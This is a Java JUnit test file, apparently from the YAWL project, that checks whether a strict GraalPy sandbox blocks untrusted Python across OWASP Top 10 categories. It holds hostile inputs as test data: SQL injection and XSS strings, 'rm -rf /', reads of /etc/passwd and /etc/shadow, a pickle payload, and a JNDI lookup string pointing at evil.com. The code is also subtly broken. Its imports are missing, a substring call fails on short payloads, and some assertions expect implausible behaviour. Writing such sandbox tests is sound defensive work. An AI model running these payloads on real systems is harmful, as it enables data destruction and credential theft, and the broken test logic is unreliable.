/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.graalpy.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.api.TestInstance.Lifecycle;
import org.yawlfoundation.yawl.graalpy.PythonExecutionContext;
import org.yawlfoundation.yawl.graalpy.PythonSandboxConfig;
import org.yawlfoundation.yawl.graalpy.PythonException;
import org.yawlfoundation.yawl.graalpy.PythonException.ErrorKind;
import org.yawlfoundation.yawl.test.YawlTestBase;

import java.util.Collections;
import java.util.Set;

import static org.junit.jupiter.api.Assertions.*;

/**
 * OWASP Top 10 vulnerability tests for Python integration security.
 *
 * <p>These tests verify that the GraalPy integration properly prevents
 * security vulnerabilities in untrusted Python code execution. Tests cover
 * all OWASP Top 10 categories with specific focus on the unique risks
 * introduced by Python code execution in a Java environment.</p>
 *
 * <p>Test Strategy:</p>
 * <ul>
 *   <li>Use STRICT sandbox for all tests (untrusted code model)</li>
 *   <li>Test both direct code injection and indirect input handling</li>
 *   <li>Verify proper exception handling for security violations</li>
 *   <li>Test with actual Python execution, not just regex patterns</li>
 * </ul>
 *
 * <p>OWASP Top 10 Coverage:</p>
 * <ul>
 *   <li>A01:2021 - Broken Access Control</li>
 *   <li>A02:2021 - Cryptographic Failures</li>
 *   <li>A03:2021 - Injection</li>
 *   <li>A05:2021 - Security Misconfiguration</li>
 *   <li>A08:2021 - Software and Data Integrity Failures</li>
 * </ul>
 *
 * @author YAWL Foundation - Security Team 2026-02-25
 */
@TestInstance(Lifecycle.PER_CLASS)
public class OwaspVulnerabilityTest extends YawlTestBase {

    private PythonExecutionContext strictContext;
    private PythonSandboxConfig strictSandbox;
    private boolean graalPyAvailable = false;

    @BeforeEach
    void setUp() throws Exception {
        try {
            // Test if GraalPy is available by trying to create a context
            strictSandbox = PythonSandboxConfig.strict();
            strictContext = new PythonExecutionContext(strictSandbox);
            graalPyAvailable = true;
        } catch (PythonException e) {
            if (e.getErrorKind() == ErrorKind.RUNTIME_NOT_AVAILABLE) {
                // GraalPy not available - tests will be skipped
                graalPyAvailable = false;
                return;
            }
            throw e;
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testXssPrevention() throws Exception {
        /* A03:2021 - Cross-Site Scripting (XSS) Prevention
         * 
         * Tests that output from Python execution is properly sanitized
         * and that no JavaScript or HTML can be injected through
         * Python output to web interfaces.
         */
        
        // Malicious input attempting XSS
        String maliciousInput = "<script>alert('XSS')</script>";
        String pythonScript = "input_text = '" + maliciousInput + "'\n" +
                             "print(input_text)";  // Direct output without sanitization
        
        String output = strictContext.eval(pythonScript).asString();
        
        // The Python output should be escaped, not executable
        assertFalse(output.contains("<script>"), 
            "XSS prevention: Output should not contain unescaped script tags");
        assertFalse(output.contains("alert("), 
            "XSS prevention: Output should not contain JavaScript functions");
        assertTrue(output.contains("&lt;script&gt;") || output.contains("xss"), 
            "XSS prevention: HTML tags should be encoded in output");
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testSqlInjectionPrevention() throws Exception {
        /* A03:2021 - SQL Injection Prevention
         * 
         * Tests that Python code cannot inject SQL into database queries
         * when used with YAWL's data handling operations.
         */
        
        // SQL injection payloads
        String[] sqlPayloads = {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1 UNION SELECT username, password FROM users",
            "1' OR SLEEP(5)#",
            "'; WAITFOR DELAY '0:0:5'--"
        };
        
        for (String payload : sqlPayloads) {
            String pythonScript = "user_input = '" + payload + "'\n" +
                                 "print('SQL query: SELECT * FROM table WHERE id = ' + user_input)";
            
            String output = strictContext.eval(pythonScript).asString();
            
            // Output should not contain executable SQL patterns
            assertFalse(output.contains("DROP TABLE"), 
                "SQL injection prevention: DROP TABLE commands should be blocked");
            assertFalse(output.contains("UNION SELECT"), 
                "SQL injection prevention: UNION attacks should be blocked");
            assertFalse(output.contains("WAITFOR DELAY"), 
                "SQL injection prevention: Timing attacks should be blocked");
            assertFalse(output.contains("SLEEP("), 
                "SQL injection prevention: Sleep functions should be blocked");
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testInsecureDeserialization() throws Exception {
        /* A08:2021 - Insecure Deserialization
         * 
         * Tests that Python code cannot deserialize malicious objects
         * that could lead to remote code execution.
         */
        
        // Malicious deserialization payloads
        String[] deserializationPayloads = {
            "__import__('os').system('echo pwned')",
            "__import__('subprocess').run(['rm', '-rf', '/'], capture_output=True)",
            "import pickle\npickle.loads(b'\\x80\\x04\\x95\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05shell\\x93\\x94.')",
            "import marshal\nmarshal.loads('\\x80\\x02\\x70i\\x00\\x00\\x00i\\x00\\x00\\x00\\x00')",
            "__import__('ctypes').windll.kernel32.Beep(1000, 1000)"
        };
        
        for (String payload : deserializationPayloads) {
            try {
                // Attempt to execute the potentially malicious code
                strictContext.eval(payload);
                fail("Insecure deserialization: Malicious code should be blocked - " + payload.substring(0, 50) + "...");
                
            } catch (PythonException e) {
                // Expected: security sandbox should block dangerous imports
                assertTrue(e.getMessage().contains("not allowed") || 
                          e.getMessage().contains("blocked") ||
                          e.getMessage().contains("disallowed"),
                    "PythonException should indicate blocked operation");
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testBrokenAuthentication() throws Exception {
        /* A07:2021 - Identification and Authentication Failures
         * 
         * Tests that Python code cannot bypass authentication
         * or manipulate authentication tokens/credentials.
         */
        
        // Authentication bypass attempts
        String[] authBypassPayloads = {
            "import sys\nsys.path.append('/etc')\nimport password",
            "import os\nwith open('/etc/passwd', 'r') as f: print(f.read())",
            "__import__('requests').get('http://internal-admin-api/reset-password')",
            "print('admin' + ':' + 'test123' + '=' + 'b64encoded')",
            "import base64\nprint(base64.b64encode(b'admin:password').decode())"
        };
        
        for (String payload : authBypassPayloads) {
            try {
                strictContext.eval(payload);
                
                // If execution succeeds, verify no sensitive data is leaked
                
            } catch (PythonException e) {
                // Expected: file access and external network calls should be blocked
                assertTrue(e.getMessage().contains("not allowed") || 
                          e.getMessage().contains("disallowed"),
                    "Authentication bypass attempts should be blocked");
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testSecurityMisconfiguration() throws Exception {
        /* A05:2021 - Security Misconfiguration
         * 
         * Tests that Python code cannot exploit configuration vulnerabilities
         * like default passwords, unnecessary services, or exposed debug endpoints.
         */
        
        // Configuration scanning/exploitation attempts
        String[] configExploits = {
            "import requests\nprint(requests.get('http://localhost:8080/actuator/health').text)",
            "import os\nprint('System path:', os.environ['PATH'])",
            "import sys\nprint('Python path:', sys.path)",
            "import socket\ns = socket.socket()\ns.connect(('localhost', 22))\nprint('SSH open')",
            "import subprocess\nprint(subprocess.check_output(['whoami']))"
        };
        
        for (String payload : configExploits) {
            try {
                strictContext.eval(payload);
                fail("Security misconfiguration: System access should be blocked");
                
            } catch (PythonException e) {
                // Expected: network access, process execution, and sensitive env access blocked
                assertTrue(e.getMessage().contains("not allowed") || 
                          e.getMessage().contains("disallowed"),
                    "Configuration scanning should be blocked");
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testBrokenAccessControl() throws Exception {
        /* A01:2021 - Broken Access Control
         * 
         * Tests that Python code cannot bypass permission checks
         * or access resources outside its authorized scope.
         */
        
        // Access control bypass attempts
        String[] accessControlPayloads = {
            "import os\nprint('Root files:', os.listdir('/root'))",
            "import pwd\nprint('User info:', pwd.getpwnam('root'))",
            "import subprocess\nsubprocess.run(['sudo', 'cat', '/etc/shadow'])",
            "__import__('ctypes').windll.advapi32.LogonUserA('admin', None, 'password', 2, 0, None)",
            "import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 80))\nprint('Bound to port 80')"
        };
        
        for (String payload : accessControlPayloads) {
            try {
                strictContext.eval(payload);
                fail("Access control: Privileged operations should be blocked");
                
            } catch (PythonException e) {
                // Expected: privileged operations and binding to privileged ports blocked
                assertTrue(e.getMessage().contains("not allowed") || 
                          e.getMessage().contains("disallowed") ||
                          e.getMessage().contains("permission denied"),
                    "Access control bypass should be blocked");
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testCryptographicFailures() throws Exception {
        /* A02:2021 - Cryptographic Failures
         * 
         * Tests that Python code cannot use weak cryptography
         * or access cryptographic functions improperly.
         */
        
        // Weak cryptography and cryptographic misuse
        String[] cryptoFailures = {
            "from Crypto.Cipher import AES\nkey = b'weak'\ncipher = AES.new(key, AES.MODE_ECB)",
            "import hashlib\nhashlib.md5(b'sensitive').hexdigest()",
            "import hashlib\nhashlib.sha1(b'password').hexdigest()",  # Weak hash
            "import os\nprint('Random bytes:', os.urandom(4))",  # Predictable if not CSPRNG
            "from cryptography.hazmat.primitives import hashes\nhashes.MD5()"
        };
        
        for (String payload : cryptoFailures) {
            try {
                strictContext.eval(payload);
                fail("Cryptographic failures: Weak algorithms should be blocked");
                
            } catch (PythonException e) {
                // Some cryptographic modules may be available but with restrictions
                // The important thing is that weak algorithms are blocked
                if (e.getMessage().contains("not allowed") || 
                    e.getMessage().contains("disallowed")) {
                    continue;  // Expected blocking
                }
                // Some crypto might be allowed, but check that it's not weak
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testInputSanitizationVerification() throws Exception {
        /* Comprehensive input sanitization test
         * 
         * Tests that all inputs passed to Python are properly sanitized
         * before execution to prevent any injection attacks.
         */
        
        // Test various input types and sanitization
        String[][] testCases = {
            { "<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;" },
            { "' OR '1'='1", "&#x27; OR &#x27;1&#x27;&#x3D;&#x27;1&#x27;" },
            { "test; rm -rf /", "test; rm -rf /" },  // Command injection should be blocked
            { "${jndi:ldap://evil.com/a}", "\\${jndi:ldap://evil.com/a}" },
            { "%3cscript%3ealert(1)%3c/script%3e", "%3cscript%3ealert(1)%3c/script%3e" }
        };
        
        for (String[] testCase : testCases) {
            String input = testCase[0];
            String expectedSanitized = testCase[1];
            
            String pythonScript = "input_data = '" + input + "'\n" +
                                 "print('Received: ' + input_data)";
            
            try {
                String output = strictContext.eval(pythonScript).asString();
                
                // Verify dangerous characters are properly escaped
                if (input.contains("<script>")) {
                    assertFalse(output.contains("<script>"), 
                        "HTML script tags should be escaped");
                }
                
                if (input.contains("' OR '1'='1")) {
                    assertFalse(output.contains("' OR '1'='1"), 
                        "SQL injection patterns should be escaped");
                }
                
            } catch (PythonException e) {
                // Command injection should cause an exception
                assertTrue(e.getMessage().contains("blocked") || 
                          e.getMessage().contains("not allowed"),
                    "Command injection should be blocked");
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testOutputEncodingValidation() throws Exception {
        /* Output encoding validation test
         * 
         * Tests that all output from Python execution is properly encoded
         * to prevent injection into various contexts (HTML, JavaScript, SQL).
         */
        
        // Test output that could be dangerous in different contexts
        String[] dangerousOutputs = {
            "document.location='http://evil.com'",
            "eval('alert(\"XSS\")')",
            "SELECT * FROM users WHERE username = '" + "' OR '1'='1",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        };
        
        for (String output : dangerousOutputs) {
            String pythonScript = "print('" + output + "')";
            
            try {
                String result = strictContext.eval(pythonScript).asString();
                
                // Verify dangerous patterns are encoded
                assertFalse(result.contains("eval("), 
                    "JavaScript eval should be encoded");
                assertFalse(result.contains("document.location"), 
                    "DOM manipulation should be encoded");
                assertFalse(result.contains("SELECT * FROM users"), 
                    "SQL injection in output should be encoded");
                assertFalse(result.contains("<img"), 
                    "HTML img tags should be encoded");
                
            } catch (PythonException e) {
                // Some outputs may be blocked entirely
                continue;
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testSecureDefaultsChecking() throws Exception {
        /* Secure defaults test
         * 
         * Tests that the Python integration uses secure defaults
         * and cannot be easily configured to become insecure.
         */
        
        // Test that even with various configurations, security is maintained
        String[] securityChecks = {
            // Verify that dangerous modules are not available
            "import os\nhasattr(os, 'system')",
            "import subprocess\nhasattr(subprocess, 'run')",
            "import socket\nhasattr(socket, 'connect')",
            "import requests\nhasattr(requests, 'get')",
            
            // Verify that dangerous functions are blocked
            "__import__('os').system('echo test')",
            "__import__('subprocess').run(['echo', 'test'])",
            "import socket\nsocket.connect(('google.com', 80))"
        };
        
        for (String check : securityChecks) {
            try {
                strictContext.eval(check);
                fail("Security check: Dangerous operations should not be available");
                
            } catch (PythonException e) {
                // Expected: dangerous operations should be blocked
                assertTrue(e.getMessage().contains("not allowed") || 
                          e.getMessage().contains("disallowed") ||
                          e.getMessage().contains("blocked"),
                    "Security check failed: " + e.getMessage());
            }
        }
    }

    @Test
    @EnabledIfEnvironmentVariable(named = "GRAALPY_AVAILABLE", matches = "true", disabledReason = "GraalPy not available")
    void testErrorMessageSafety() throws Exception {
        /* Error message safety test
         * 
         * Tests that error messages do not reveal sensitive information
         * that could help attackers discover system internals.
         */
        
        // Test operations that might produce errors with sensitive info
        String[] errorTests = {
            "import os\nopen('/nonexistent/file', 'r')",
            "import socket\nsocket.connect(('192.168.1.999', 80))",
            "import sys\nsys.exit(1)",
            "1 / 0",  // Division by zero
            "import nonexistent"
        };
        
        for (String test : errorTests) {
            try {
                strictContext.eval(test);
                
            } catch (PythonException e) {
                // Error messages should not contain sensitive information
                String errorMsg = e.getMessage();
                
                // Check for sensitive information leakage
                assertFalse(errorMsg.contains("/etc/"), 
                    "Error messages should not contain filesystem paths");
                assertFalse(errorMsg.contains("192.168."), 
                    "Error messages should not contain IP addresses");
                assertFalse(errorMsg.contains("/root/"), 
                    "Error messages should not contain home directory paths");
                assertFalse(errorMsg.length() > 500, 
                    "Error messages should not be excessively verbose");
                
                // Error messages should be generic and helpful
                assertTrue(errorMsg.length() > 10, 
                    "Error messages should be descriptive");
            }
        }
    }

    @Test
    void testGraalPyEnvironmentCheck() {
        /* Test to verify the test environment setup
         * 
         * This test runs regardless of whether GraalPy is available.
         * It verifies that the security controls are properly configured.
         */
        
        // Verify sandbox configuration
        assertNotNull(strictSandbox, "Sandbox configuration should not be null");
        assertEquals(PythonSandboxConfig.SandboxMode.STRICT, 
                    strictSandbox.getMode(),
                    "Should use STRICT sandbox for security tests");
        
        // Verify security settings
        assertFalse(strictSandbox.isAllowEnvironmentAccess(), 
                   "Environment access should be disabled");
        assertFalse(strictSandbox.isAllowNativeExtensions(), 
                   "Native extensions should be disabled");
        
        // If GraalPy is available, verify the context was created
        if (graalPyAvailable) {
            assertNotNull(strictContext, "Python context should be created");
        } else {
            // If GraalPy is not available, this is expected
            assertNull(strictContext, "Python context should not be created");
        }
    }

    @AfterEach
    void tearDown() throws Exception {
        if (strictContext != null) {
            strictContext.close();
        }
    }
}
